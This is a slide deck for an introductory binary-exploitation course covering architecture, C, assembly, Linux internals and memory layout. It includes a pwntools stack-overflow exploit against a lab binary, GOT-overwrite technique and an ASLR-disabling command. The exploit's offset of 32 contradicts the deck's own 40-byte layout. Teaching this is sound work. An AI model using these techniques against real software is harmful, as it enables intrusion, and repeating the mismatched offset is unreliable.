---
marp: true
theme: default
paginate: true
style: |
  section {
    font-family: 'Courier New', monospace;
    font-size: 22px;
  }
  h1 { color: #e74c3c; }
  h2 { color: #c0392b; border-bottom: 2px solid #e74c3c; }
  h3 { color: #e67e22; }
  code { background: #1e1e1e; color: #d4d4d4; padding: 2px 6px; border-radius: 3px; }
  pre { background: #1e1e1e; color: #d4d4d4; }
  table { font-size: 18px; }
  .columns { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
---

<!-- How to render this file:
     VS Code: install "Marp for VS Code" extension, open this file, click the preview icon
     CLI:     npm install -g @marp-team/marp-cli
              marp presentation.md --pdf        (export to PDF)
              marp presentation.md --html       (export to HTML)
-->

# Module 1: Foundations
## From Hardware to Exploitation

**Cybersecurity Course — Low-Level Security Research**

---

## What You Will Learn

This module builds the complete mental model you need before touching an exploit.

1. **Computer Architecture** — how a CPU executes code
2. **C Programming** — why C is the language of vulnerabilities
3. **x86-64 Assembly** — reading disassembly fluently
4. **Linux Internals** — processes, memory, ELF, syscalls
5. **Memory Layout** — where everything lives at runtime
6. **End-to-End Workflow** — source code → binary → exploitation

> Every technique in this course is rooted in one or more of these topics.

---

<!-- SECTION BREAK -->
# Part 1
## Computer Architecture

---

## What Is a Computer?

```
+------------------+        +------------------+
|       CPU        | <----> |      Memory      |
|  (does the work) |  bus   |  (stores data &  |
|                  |        |   instructions)  |
+------------------+        +------------------+
         |
         | I/O bus
         v
+------------------+
|  Input / Output  |
|  (keyboard,      |
|   screen, disk)  |
+------------------+
```

A computer is a machine that executes instructions stored in memory.
**Everything** — programs, images, videos — is just numbers (bits) in memory.

---

## Bits, Bytes, and Hexadecimal

| Unit | Size | Example |
|------|------|---------|
| bit | 1 bit | `0` or `1` |
| byte | 8 bits | `0xFF` |
| word | 16 bits | `0xFFFF` |
| dword | 32 bits | `0xDEADBEEF` |
| **qword** | **64 bits** | `0xDEADBEEFCAFEBABE` |

**One hex digit = 4 bits. Two hex digits = 1 byte.**

```
0xFF = 255 decimal  = 11111111 binary
0x41 = 65  decimal  = ASCII 'A'
0x00 = 0   decimal  = null byte  (terminates C strings)
```

> Prefixes: `0x` = hex, `0b` = binary

---

## The CPU: Fetch-Decode-Execute

```
+----------+      +----------+      +----------+
|  FETCH   | ---> |  DECODE  | ---> |  EXECUTE |
|          |      |          |      |          |
| Read the |      | Figure   |      | Do the   |
| next     |      | out what |      | operation|
|instruction      | it means |      | (add,    |
| from RAM |      |          |      |  jump...) |
+----------+      +----------+      +----------+
     ^                                    |
     |____________________________________|
              (repeat forever)
```

The CPU always knows what to run next via the **Instruction Pointer** (`RIP` on x86-64).

```
Address    Bytes        Instruction
0x401000   55           push rbp      <--- RIP points here
0x401001   48 89 e5     mov rbp, rsp
```

After each instruction, RIP advances automatically.

---

## Registers — The CPU's Workspace

```
General Purpose (64-bit):
  RAX  — return values from functions
  RBX  — general purpose (callee-saved)
  RCX  — 4th argument, loop counter
  RDX  — 3rd argument
  RSI  — 2nd argument
  RDI  — 1st argument
  R8   — 5th argument
  R9   — 6th argument

Special Purpose:
  RSP  — Stack Pointer   (top of the stack)
  RBP  — Base Pointer    (bottom of the current stack frame)
  RIP  — Instruction Pointer (next instruction to execute)

RFLAGS — Zero (ZF), Sign (SF), Carry (CF), Overflow (OF)
```

Only ~16 registers exist. The compiler maps variables to them when possible.

---

## Von Neumann Architecture — The Root of Exploitation

```
+-----------------------------------------------------+
|                      CPU                            |
|   Control Unit   |   ALU (math & logic)             |
|   Registers: RAX RBX RCX RDX RSI RDI RSP RBP RIP   |
+-----------------------------------------------------+
            |
    (memory bus)
            |
+---------------------+
|    Main Memory      |   stores CODE and DATA together
|    (RAM)            |
+---------------------+
```

> **Key insight:** Because code and data share the same memory, if you can write to memory you can overwrite control flow data — and redirect execution.

This is the root of every exploit in this course.

---

## Endianness (x86-64 is Little-Endian)

When storing a multi-byte value, which byte comes first?

```
Value: 0xDEADBEEF  (32-bit)

Little-endian (x86):         Big-endian (network):
Address: [0] [1] [2] [3]     Address: [0] [1] [2] [3]
Bytes:   EF  BE  AD  DE      Bytes:   DE  AD  BE  EF
         ^least sig byte              ^most sig byte
```

This matters when building payloads. In pwntools, `p64()` packs as little-endian automatically:

```python
from pwn import *
p64(0x401126)   # b'\x26\x11\x40\x00\x00\x00\x00\x00'
```

---

<!-- SECTION BREAK -->
# Part 2
## C Programming

---

## Why C?

- The Linux kernel is written in C
- Most exploitable binaries are compiled from C/C++
- C gives you direct control over memory — and direct ways to corrupt it
- C has no bounds checking — the programmer is responsible for safety

> Understanding C's memory model explains the majority of real-world vulnerabilities.

---

## What Is a Buffer?

```c
char buf[32];
```

This reserves **exactly 32 bytes** on the stack. Think of it as a box with 32 slots.

```
Stack:
[ buf[0] ][ buf[1] ]...[ buf[31] ][ saved RBP ][ return address ]
```

**The problem:** C does not automatically stop you from writing past slot 31.

Functions like `gets()`, `strcpy()`, and `scanf()` will keep writing beyond the buffer into whatever memory comes next — which is the saved base pointer and the return address.

**That is a buffer overflow.**

---

## Process Memory Layout

```
High addresses (0xFFFFFFFFFFFFFFFF)
+----------------------------------+
|         Kernel Space             |   inaccessible from userspace
+----------------------------------+
|           Stack                  |   local variables, return addresses
|               |                  |   grows DOWNWARD
|               v                  |
|               ^                  |
|               |                  |
|           Heap                   |   malloc/free memory
|                                  |   grows UPWARD
+----------------------------------+
|     BSS Segment                  |   uninitialized globals (zeroed)
+----------------------------------+
|     Data Segment                 |   initialized globals & statics
+----------------------------------+
|     Text Segment                 |   executable code (read-only)
+----------------------------------+
Low addresses (0x0000000000000000)
```

---

## Stack Frame Layout

Each function call builds a workspace on the stack:

```
Higher addresses
+---------------------------+   <- previous frame
|   return address (RIP)   |   <- overwriting this = code execution
+---------------------------+
|   saved RBP              |   <- caller's base pointer
+---------------------------+
|   local variable 2       |
+---------------------------+
|   local variable 1       |
+---------------------------+
|   char buf[32]           |   <- if you overflow buf, you march UPWARD
|   buf[0] ... buf[31]     |      toward the return address
+---------------------------+   <- RSP (grows downward)
Lower addresses
```

Total distance from start of `buf[32]` to end of return address: **32 + 8 + 8 = 48 bytes**

---

## Buffer Overflow — Before and After

```c
void vulnerable(char *input) {
    char buf[32];
    strcpy(buf, input);   // no bounds check!
}
```

```
Before (safe input):
+---------------------------+
|   return address          |   0x00401234  (legitimate)
+---------------------------+
|   saved RBP               |   0x7fff...f050
+---------------------------+
|   buf[31] ... buf[0]      |   "Alice\0"
+---------------------------+

After (48 x 'A'):
+---------------------------+
|   return address          |   0x4141414141414141  <- CORRUPTED
+---------------------------+
|   saved RBP               |   0x4141414141414141  <- CORRUPTED
+---------------------------+
|   buf[31] ... buf[0]      |   "AAAAAAAAAAAAAAAA..."
+---------------------------+
```

When the function hits `RET`, the CPU jumps to `0x4141414141414141` → **SIGSEGV**
Replace `0x4141...` with a real address → **code execution**

---

## Unsafe Functions — Never Use in Production

| Function | Problem | Safe Alternative |
|---|---|---|
| `gets(buf)` | No size limit on read | `fgets(buf, sizeof(buf), stdin)` |
| `strcpy(dst, src)` | No length check | `strncpy(dst, src, n)` |
| `strcat(dst, src)` | No length check | `strncat(dst, src, n)` |
| `sprintf(buf, fmt, ...)` | No size limit | `snprintf(buf, size, fmt, ...)` |
| `scanf("%s", buf)` | No size limit | `scanf("%15s", buf)` |
| `printf(user_input)` | Format string bug | `printf("%s", user_input)` |

> `printf(user_input)` with `%n` in the input gives the attacker an **arbitrary write** to any memory address.

---

<!-- SECTION BREAK -->
# Part 3
## x86-64 Assembly

---

## Why Read Assembly?

- Decompilers (Ghidra, IDA) produce C-like pseudocode — **they lie**. Assembly is ground truth.
- Exploit development requires knowing exactly what instructions execute.
- Shellcode is written in assembly.
- Mitigations like ASLR, NX, and stack canaries are visible at the assembly level.

```bash
# Compile and disassemble
gcc -O0 -g -o program program.c
objdump -d -M intel program
```

> You don't need to write complex programs in assembly.
> You **must** be able to read it fluently.

---

## Register Sizes (Same Register, Different Views)

```
64-bit   32-bit   16-bit   8-bit
RAX      EAX      AX       AL / AH
RBX      EBX      BX       BL / BH
RCX      ECX      CX       CL / CH
RDX      EDX      DX       DL / DH
RSI      ESI      SI       SIL
RDI      EDI      DI       DIL
RSP      ESP      SP       SPL     <- stack pointer
RBP      EBP      BP       BPL     <- base pointer
RIP      EIP      IP              <- instruction pointer
R8..R15  (64-bit only)
```

Writing to `EAX` **zero-extends** into `RAX`. Writing to `AX` does **not** clear the upper bytes.

---

## Core Instructions

```nasm
; Data movement
mov  dst, src        ; dst = src
lea  dst, [addr]     ; dst = address  (no memory read)
push src             ; RSP -= 8; [RSP] = src
pop  dst             ; dst = [RSP]; RSP += 8

; Arithmetic
add  dst, src        ; dst = dst + src
sub  dst, src        ; dst = dst - src
inc  dst             ; dst += 1
xor  dst, dst        ; dst = 0  (fastest way to zero a register)

; Compare and jump
cmp  a, b            ; a - b, sets flags, discards result
je   label           ; jump if equal   (ZF=1)
jne  label           ; jump if not equal
jmp  label           ; unconditional jump

; Function calls
call label           ; push RIP, jump to label
ret                  ; pop [RSP] into RIP
```

---

## Memory Addressing

```nasm
mov rax, 5              ; rax = 5                  (immediate)
mov rax, rbx            ; rax = rbx                (register)
mov rax, [rbx]          ; rax = *rbx               (memory read)
mov [rbx], rax          ; *rbx = rax               (memory write)
mov rax, [rbp - 8]      ; rax = local variable     (stack access)
```

`[ ]` means **dereference** — go to that address and read/write.

```nasm
; Array indexing: arr[i] where arr is at [rbp-0x18]
mov  eax, [rbp - 4]             ; load i into eax
cdqe                             ; sign-extend to rax (64-bit)
mov  [rbp + rax*4 - 0x18], 99   ; arr[i] = 99
```

The CPU's `base + index*scale + displacement` addressing mode was built for this.

---

## Calling Convention (System V AMD64 ABI)

```
Arguments (in order):    RDI, RSI, RDX, RCX, R8, R9
                         (7th+ arguments go on the stack)

Return value:            RAX

Caller-saved:            RAX, RCX, RDX, RSI, RDI, R8, R9, R10, R11
                         (callee may overwrite these)

Callee-saved:            RBX, RBP, R12, R13, R14, R15
                         (callee must restore these)
```

```c
int result = add(1, 2);   // C
```

```nasm
mov  edi, 1               ; 1st argument -> RDI
mov  esi, 2               ; 2nd argument -> RSI
call add                  ; push return address, jump
; RAX holds the return value after the call
```

---

## Stack Frame in Assembly

Every function follows this prologue/epilogue pattern:

```nasm
; Prologue — function entry
push rbp           ; save caller's base pointer
mov  rbp, rsp      ; establish our base pointer (anchor)
sub  rsp, 0x20     ; allocate 32 bytes for local variables

; ... function body ...

; Epilogue — function exit
leave              ; mov rsp, rbp; pop rbp
ret                ; pop [RSP] into RIP → return to caller
```

After prologue:
```
[ local vars (0x20 bytes) ] <- RSP
[ saved RBP               ] <- RBP
[ return address          ] <- RBP + 8
```

> The return address is always at **`[RBP + 8]`** — this is what you overwrite.

---

## Syscalls

Your program runs in **userspace (Ring 3)** — it cannot touch hardware directly. To do anything privileged, it asks the kernel via a **syscall**.

```nasm
; write(1, "Hello\n", 6)
mov rax, 1          ; syscall number 1 = write
mov rdi, 1          ; fd 1 = stdout
lea rsi, [rel msg]  ; pointer to string
mov rdx, 6          ; number of bytes
syscall             ; CPU switches to Ring 0, kernel writes
```

| RAX | Name | Effect |
|-----|------|--------|
| 0 | `read` | read from fd |
| 1 | `write` | write to fd |
| 59 | `execve` | replace process with new program |
| 60 | `exit` | terminate |

> `execve("/bin/sh", NULL, NULL)` → shell. This is the goal of most shellcode.

---

<!-- SECTION BREAK -->
# Part 4
## Linux Internals

---

## Processes

A process is a running instance of a program with its own virtual address space.

```bash
ps aux                    # list all processes
cat /proc/self/maps       # memory map of this process
cat /proc/<pid>/maps      # memory map of any process
strace ./program          # trace every syscall
ltrace ./program          # trace every library call
```

### Process States

| State | Meaning |
|-------|---------|
| Running | Executing on a CPU core |
| Sleeping | Waiting for I/O or an event |
| Stopped | Paused (e.g., by GDB) |
| Zombie | Exited, not yet cleaned up by parent |

---

## Virtual Memory — Each Process Has Its Own Space

```
0xFFFFFFFFFFFFFFFF
+==================================+
|          KERNEL SPACE            |   shared, not accessible
+==================================+

+----------------------------------+   randomized if ASLR on
|              STACK               |   grows down
|                                  |
|           Libraries (.so)        |   e.g., libc.so.6
|                                  |
|              HEAP                |   grows up (malloc)
|                                  |
|         Program binary           |   .text, .data, .bss
+----------------------------------+
0x0000000000000000
```

Two processes can share the same virtual address — they map to different physical RAM.
The **MMU** (Memory Management Unit) translates virtual → physical via page tables.

---

## File Descriptors

In Linux, **everything is a file**: regular files, sockets, pipes, devices.

A file descriptor (fd) is a small integer referencing an open file:

```
fd 0  ->  stdin   (standard input)
fd 1  ->  stdout  (standard output)
fd 2  ->  stderr  (standard error)
fd 3+ ->  opened by your program
```

```c
int fd = open("file.txt", O_RDONLY);   // returns 3
read(fd, buf, 100);
close(fd);
```

**Signals you will see when exploiting:**

| Signal | Cause |
|--------|-------|
| SIGSEGV (11) | Invalid memory access — your overflow crashed |
| SIGTRAP (5) | Debugger breakpoint hit |
| SIGABRT (6) | Stack canary fired — abort before RET |

---

## ELF Binary Format

Linux executables are ELF (Executable and Linkable Format) files.

```
ELF File:
+------------------+
|   ELF Header     |  magic bytes (7f 45 4c 46), arch, entry point
+------------------+
|  Program Headers |  tells the OS how to map the file into memory
+------------------+
|   .text          |  executable code (r-x)
|   .rodata        |  read-only data — string literals
|   .data          |  initialized globals (rw-)
|   .bss           |  uninitialized globals, zeroed at startup
|   .plt           |  Procedure Linkage Table — stubs for libc calls
|   .got / .got.plt|  Global Offset Table — resolved libc addresses
+------------------+
```

```bash
file ./binary             # confirm ELF, architecture
readelf -S ./binary       # list all sections
objdump -d ./binary       # disassemble .text
strings ./binary          # extract readable strings
checksec --file=./binary  # show security mitigations
```

---

## PLT and GOT — How libc Calls Work

The compiler doesn't know where `printf` lives at runtime. Two structures solve this:

```
.plt (executable — code)         .got.plt (writable — data)
+----------------------+          +---------------------+
|  printf@plt:         |          |  printf@got:        |
|    jmp [printf@got]  | -------> |  <address>          |
+----------------------+          +---------------------+
```

**First call:** GOT entry is empty → dynamic linker finds `printf` in libc → fills GOT

**Every subsequent call:** PLT jumps directly to real `printf` (no linker overhead)

### Why this matters for exploitation

The GOT is **writable** (Partial RELRO). If you write an arbitrary value to `got['printf']`:

```
printf("/bin/sh")    →    calls system("/bin/sh")    →    shell
```

**Full RELRO** makes the GOT read-only after startup — preventing this.

---

## Dynamic Linking and libc

```bash
ldd ./binary              # show which .so files are loaded
```

```
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3a42100000)
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^
              file on disk                         base address (changes with ASLR)
```

`libc.so.6` contains `printf`, `malloc`, `system`, and the string `"/bin/sh"`.

**Finding function offsets in libc:**

```bash
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep system
# 0000000000050d60 T system
```

```python
# In an exploit script
runtime_addr = libc_base + libc.symbols['system']
```

> Runtime address = libc_base (from a leak) + fixed offset (from static analysis)

---

<!-- SECTION BREAK -->
# Part 5
## Memory Layout

---

## Memory Hierarchy

```
Fastest, smallest
+------------------+
|   CPU Registers  |  ~16 × 8 bytes   |  < 1 ns   |  inside the CPU
+------------------+
|   L1 Cache       |  ~32 KB          |  ~1 ns    |  on the CPU die
+------------------+
|   L2 Cache       |  ~256 KB         |  ~4 ns    |  on the CPU die
+------------------+
|   L3 Cache       |  ~8 MB           |  ~10 ns   |  shared across cores
+------------------+
|   RAM (DRAM)     |  GBs             |  ~100 ns  |  main memory
+------------------+
|   Disk / SSD     |  TBs             |  ms/µs    |  persistent storage
+------------------+
Slowest, largest
```

When exploiting, you operate in **RAM**. CPU registers are your immediate workspace.

---

## Stack in Detail — Multiple Frames

```
HIGH ADDRESS
+-------------------------------+
|  _start's saved state         |
+-------------------------------+
|  main()'s return address      |   <- say_hello() will return here
|  saved RBP (main's)           |   <- say_hello's RBP points here
|  char buf[32]                 |   <- say_hello's local buffer
+-------------------------------+   <- RSP (inside say_hello)
LOW ADDRESS
```

**Key rules:**
- Stack grows **downward** (lower addresses)
- `RSP` always points to the **top** (lowest address)
- `RBP` anchors the **current frame**
- Return address is always at `[RBP + 8]`
- Overflowing a local buffer writes **toward higher addresses** → toward the return address

---

## Heap in Detail

```
Heap (grows upward):

+---------------------------+
|  chunk header (16 bytes)  |   size, flags — managed by malloc internally
+---------------------------+
|  64 bytes of user data    |   <- malloc(64) returns a pointer here
+---------------------------+
|  chunk header (16 bytes)  |
+---------------------------+
|  another allocation       |
+---------------------------+
|  top chunk                |   available heap space
+---------------------------+
```

```c
char *buf = malloc(64);   // heap allocation
free(buf);                // release it back
```

Heap overflows corrupt adjacent chunk headers → the basis of heap exploitation (covered in module 3).

---

<!-- SECTION BREAK -->
# Part 6
## End-to-End Workflow

---

## The Full Pipeline

```
You write C code
      |
      | gcc (compiler)
      v
ELF binary (file on disk)
      |
      | execve() — OS loader
      v
Process in virtual memory
      |
      | CPU fetch-decode-execute cycle
      v
Instructions running in RAM
      |
      | bug in code (e.g., gets())
      v
Memory corruption
      |
      | attacker controls input
      v
Return address overwritten
      |
      | RET instruction
      v
Attacker's code executes
```

---

## Stage 1 — C to Binary (Compilation)

```
program.c
    |
    | 1. Preprocessor (cpp)   — expands #include, #define
    v
program.i
    |
    | 2. Compiler (cc1)       — translates C to assembly
    v
program.s
    |
    | 3. Assembler (as)       — assembly to machine code bytes
    v
program.o  (object file — not yet executable)
    |
    | 4. Linker (ld)          — combines objects, resolves libc symbols
    v
program    (ELF executable)
```

```bash
gcc -E program.c -o program.i    # stop after preprocessor
gcc -S program.c -o program.s    # stop after compiler (see assembly)
gcc -c program.c -o program.o    # stop after assembler
gcc program.c -o program         # all four stages at once
```

---

## Stage 2 — Binary to Process (Loading)

```
execve("./program")
    |
    v
Kernel reads ELF header → finds entry point + LOAD segments
    |
    v
Kernel creates new process → new virtual address space
    |
    v
Kernel maps ELF segments into virtual memory:
    .text   → r-x  (readable + executable)
    .data   → rw-  (readable + writable)
    .bss    → rw-, zeroed
    |
    v
Dynamic linker (ld-linux.so) maps libc, fills in GOT entries
    |
    v
Kernel builds stack: pushes argc, argv[], envp[]
    |
    v
Kernel jumps to _start → calls main()
```

---

## Stage 3 — Execution and Overflow

Inside `say_hello()`:

```
Stack layout:
[rbp - 32]  char buf[32]       <- sprintf writes here
[rbp +  0]  saved RBP          <- 8 bytes
[rbp +  8]  return address     <- overwrite this

Overflow with a long name:
bytes  0–31  → fill buf exactly
bytes 32–39  → overwrite saved RBP   (0x4141414141414141)
bytes 40–47  → overwrite return addr (0x4141414141414141)
```

When `say_hello` executes `RET`:
- CPU pops `[RSP]` → `RIP = 0x4141414141414141`
- That address is not mapped → **SIGSEGV**

Replace `0x4141...` with the address of `win()` → **code execution**

---

## The Exploit (pwntools)

```python
from pwn import *

elf = ELF('./program-vuln')

offset   = 32                    # bytes of name before return address
win_addr = elf.symbols['win']    # address of the win() function

payload  = b'A' * offset         # fill buf up to return address
payload += p64(win_addr)         # overwrite return address

p = process('./program-vuln')
p.sendline(payload)
p.interactive()
```

**What `p64()` does:** packs `win_addr` as 8 bytes, little-endian — exactly the format the CPU expects to find on the stack.

---

## Security Mitigations Overview

| Mitigation | Flag | What it stops |
|---|---|---|
| Stack Canary | `-fstack-protector` | Overflow detected before RET fires |
| NX (No-eXecute) | default on | Injected shellcode can't execute |
| PIE | `-pie` | Binary base address randomized |
| ASLR | OS setting | Stack, heap, libc addresses randomized |
| Full RELRO | linker flag | GOT made read-only after startup |

```bash
checksec --file=./binary    # check which mitigations are active
```

None of these are unbreakable — each one has a bypass technique, covered in module 3.

---

<!-- SECTION BREAK -->
# Hands-On Exercises

---

## What's in the exercises/ directory

All 5 exercises use `program.c` or `program-vuln.c` — already written for you.

| Exercise | What you do |
|---|---|
| **01** | Step through stack frames in GDB — draw the stack on paper |
| **02** | Confirm heap address lands in `/proc/<pid>/maps` `[heap]` region |
| **03** | Read `[rbp+8]` in GDB, write down the return address, watch `RET` use it |
| **04** | Use a cyclic pattern to find the offset, write `exploit.py`, pop `win()` |
| **05** | Re-compile with `-fstack-protector` then `-pie` — watch each mitigation break the exploit |

```bash
# Setup before starting (run once per session)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Compile for exercises 1–3
gcc -g -fno-stack-protector -no-pie -o program program.c
```

---

## Connecting Every Concept

| Concept | Where it appears |
|---|---|
| Bits and bytes | Every address, every value in memory |
| C programming | Where the bug is written |
| Compilation | C becomes machine code + ELF sections |
| ELF format | Binary on disk — structure visible with readelf |
| Virtual memory | OS maps binary into RAM |
| Stack frames | Created on every function call |
| Calling convention | How arguments and return addresses are passed |
| Assembly / RIP | CPU follows RIP; `RET` pops the return address |
| Buffer overflow | Unsafe write corrupts the stack |
| Exploit | Attacker redirects RIP to their target |
| Mitigations | Inserted at compile time (canary, NX) or load time (ASLR, PIE) |

---

## The Key Takeaway

> A program is just data in memory. The CPU does not distinguish between "code" and "data" — it executes whatever `RIP` points to.

If an attacker can write to memory and redirect `RIP`, they control the CPU.

Every technique in this course is a variation of:

```
1. Find a way to write to memory you shouldn't control
       (buffer overflow, format string, heap overflow)

2. Use that write to redirect RIP
       (return address, GOT entry, function pointer)

3. Point RIP at something useful
       (win(), system("/bin/sh"), a ROP chain)
```

---

## What Comes Next

**Module 2 — Reverse Engineering**

- Static analysis with Ghidra and `objdump` — reading binaries you don't have source for
- Dynamic analysis with GDB — stepping through execution at the instruction level
- `strace` / `ltrace` — understanding what a binary does without reading its code

**Module 3 — Binary Exploitation**

- Stack overflows (you just did the first one)
- Return-Oriented Programming (ROP) — bypass NX
- Format string exploitation — arbitrary read and write
- Heap exploitation — corrupting malloc's internal structures

**Module 4 — Kernel Exploitation**

- How the Linux kernel works and how to debug it with QEMU + GDB
- Kernel vulnerability classes and privilege escalation techniques

---

## References

| Topic | Source |
|---|---|
| CPU, Von Neumann, fetch-decode-execute | *Computer Architecture: A Quantitative Approach* — Patterson & Hennessy |
| C memory model, unsafe functions, overflows | *Hacking: The Art of Exploitation* — Jon Erickson |
| x86-64 assembly, calling convention | [Intel SDM Vol. 2](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html) |
| Linux processes, ELF, dynamic linking | *The Linux Programming Interface* — Michael Kerrisk |
| pwntools | [pwntools documentation](https://docs.pwntools.com) |
| GDB / pwndbg | [pwndbg documentation](https://pwndbg.re/pwndbg/) |
